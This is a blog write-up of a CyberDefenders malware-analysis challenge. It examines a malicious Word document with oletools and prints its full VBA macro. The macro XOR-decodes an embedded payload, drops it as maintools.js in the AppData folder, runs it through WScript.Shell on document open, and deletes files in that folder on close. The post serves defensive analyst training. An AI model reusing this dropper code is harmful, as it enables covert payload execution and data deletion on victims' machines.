---
layout:	post
title:  "Obfuscated"
date:   2025-11-08 02:11:01 +0200
image: /images/2025-11-08-Obfuscated/obfuscated.png
categories: [CyberDefenders, Malware Analysis]
tags: [cyberdefenders]
---

---

**Challenge Link:** [Obfuscated](https://cyberdefenders.org/blueteam-ctf-challenges/obfuscated/)

<br>

## Scenario:

While working as a SOC analyst, you may encounter alerts from the enterprise Endpoint Detection and Response (EDR) system regarding unusual activity on an end-user machine. In one instance, a user reported receiving an email containing a DOC file from an unknown sender. The user subsequently submitted the document for analysis to ensure it does not pose a security risk.

<br>

## Analysis:

To begin the analysis, the challenge file `49b367ac261a722a7c2bbbc328c32545` was examined with `file` command, where it was found to be a Microsoft Word document.

```bash
$ file 49b367ac261a722a7c2bbbc328c32545 

49b367ac261a722a7c2bbbc328c32545: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: user, Template: Normal.dotm, Last Saved By: John, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 08:00, Create Time/Date: Fri Nov 25 19:04:00 2016, Last Saved Time/Date: Fri Nov 25 20:04:00 2016, Number of Pages: 1, Number of Words: 320, Number of Characters: 1828, Security: 0
```

Often word document are used as initial stagers that deploys the next stagers. Malicious word document can contain macros, external relationship (remote template) or exploit to some vulnerability. To check for these indicators, the challenge file was scanned using `oleid`.

```bash
$ oleid 49b367ac261a722a7c2bbbc328c32545 

oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: 49b367ac261a722a7c2bbbc328c32545
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |                          
                    |Document or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared 
                    |Word                |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Author              |user                |info      |Author declared in        
                    |                    |          |properties                
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
ObjectPool          |True                |low       |Contains an ObjectPool    
                    |                    |          |stream, very likely to    
                    |                    |          |contain embedded OLE      
                    |                    |          |objects or files. Use     
                    |                    |          |oleobj to check it.       
--------------------+--------------------+----------+--------------------------
```

 In the output, it can be seen that this word document contains VBA macros.

Next the VBA macros within this word document were checked using `oledump`.

```bash
$ oledump.py 49b367ac261a722a7c2bbbc328c32545 

  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

The output revealed 3 streams that contains macros :
- Stream 8 (`Macros/VBA/Module1`) marked with `M`, indicating macro with code. 
- Stream 9 (`Macros/VBA/ThisDocument`) marked with `m`, indicating macro with user form. 
- Stream 17 (`ObjectPool/_1541577328/\x01Ole10Native`) marked with `O`, indicating embedded OLE object.

Lets use `oledump` again to dump the macro code. The dumped output VB script is beautified.

```bash
oledump.py -s 8 -v 49b367ac261a722a7c2bbbc328c32545 

Attribute VB_Name = "Module1"

Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String

Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
    Dim THQNfU76nlSbtJ5nX8LY6 As Byte
    THQNfU76nlSbtJ5nX8LY6 = 45

    For i = 0 To M5wI32R3VF2g5B21EK4d - 1
        EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
        THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
    Next i

    Q7JOhn5pIl648L6V43V = True
End Function

Sub AutoClose()
    On Error Resume Next
    Kill OBKHLrC3vEDjVL

    On Error Resume Next
    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
    R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
    Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo MnOWqnnpKXfRO

    Dim NEnrKxf8l511
    Dim N18Eoi6OG6T2rNoVl41W As Long
    Dim M5wI32R3VF2g5B21EK4d As Long

    N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
    NEnrKxf8l511 = FreeFile
    Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511

    Dim E2kvpmR17SI() As Byte
    ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
    Get #NEnrKxf8l511, 1, E2kvpmR17SI

    Dim KqG31PcgwTc2oL47hjd7Oi As String
    KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)

    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
    Dim VUy5oj112fLw51h6S
    Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
    VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"

    Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)

    Dim Y5t4Ul7o385qK4YDhr
    If I4j833DS5SFd34L3gwYQD.Count = 0 Then GoTo MnOWqnnpKXfRO

    For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
        Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
        Exit For
    Next

    Dim Wk4o3X7x1134j() As Byte
    Dim KDXl18qY4rcT As Long
    KDXl18qY4rcT = 16827
    ReDim Wk4o3X7x1134j(KDXl18qY4rcT)

    Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j

    If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then GoTo MnOWqnnpKXfRO

    B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
    Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")

    If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
        B8qen2T433Ds1bW = Environ("appdata")
    End If
    Set R7Ks7ug4hRR2weOy7 = Nothing

    Dim K764B5Ph46Vh
    K764B5Ph46Vh = FreeFile
    OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"

    Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
    Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
    Close #K764B5Ph46Vh

    Erase Wk4o3X7x1134j

    Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
    R66BpJMgxXBo2h.Run """" & OBKHLrC3vEDjVL & """" & " EzZETcSXyKAdF_e5I2i1"

    ActiveDocument.Save
    Exit Sub

MnOWqnnpKXfRO:
    Close #K764B5Ph46Vh
    ActiveDocument.Save
End Sub
```

<br>

## Questions:


<br>

---